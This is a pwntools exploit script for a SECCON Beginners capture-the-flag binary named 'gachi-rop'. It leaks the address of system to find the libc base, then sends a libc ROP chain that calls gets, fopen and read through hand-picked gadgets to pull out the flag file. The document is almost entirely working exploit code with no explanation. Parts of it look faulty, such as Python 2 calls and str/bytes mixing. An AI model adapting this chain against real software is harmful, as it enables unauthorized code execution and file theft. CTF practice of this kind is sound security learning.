from pwn import *
elf_file = FILENAME = './gachi-rop'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log
const = constants


HOST = b'gachi-rop.beginners.seccon.games'
POST = 4567
libc = ELF("./libc.so.6")

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  #c = process(FILENAME)
  c = gdb.debug(FILENAME,gdbscript='''b main''')

perror_got = 0x404040

c.recvuntil(b"system@")
system_add = int(c.recv(15),16)
libc.address = system_add - libc.sym['system']
log.info(b"libc_base = %s" % repr(hex(libc.address)))

dummy = 3
push_rax_prbx_ret = 0x00007220dc174f5b - 0x7220dc000000
mov_rdi_rdx_call_r12 = 0x00007bb4f0a2b78a - 0x7bb4f0a00000

rop = ROP(libc)
#rop.raw(0x00401170) #ret
rop.gets(0x404500)
rop.rdi = 0x404500
rop.rsi = libc.search('r\x00').next()
#rop.rcx = 0
rop.rbx = 0x404018-0x360 #printf.got
rop.raw(libc.sym['fopen'])
rop.raw(libc.address+push_rax_prbx_ret)
rop.r12 = libc.sym['read']
rop.rsi = 0x404550
rop.raw(libc.address+mov_rdi_rdx_call_r12)


#rop.puts(0x404500)

log.info("ROP_chain:\n" + rop.dump())

payload =  'flag.txt'*dummy
payload += rop.chain()


c.sendline(payload)

sleep(1)
c.sendline('flag.txt')
c.interactive()